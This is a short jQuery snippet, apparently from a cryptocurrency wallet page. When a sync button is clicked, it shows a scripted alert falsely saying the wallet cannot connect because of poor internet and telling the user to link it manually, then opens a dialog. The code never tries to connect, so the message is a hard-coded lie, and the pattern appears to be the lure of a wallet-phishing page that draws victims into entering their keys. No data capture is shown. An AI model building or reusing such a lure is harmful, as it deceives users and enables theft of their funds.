$('.sync-btn').on('click', function(){ 
    alert("Wallet cannot connect automatically due to poor internet. Link manually");
    const dia = document.getElementById('dialog'); dia.showModal();
    $('#dialog-close').on('click', function(){ dia.close(); });
});
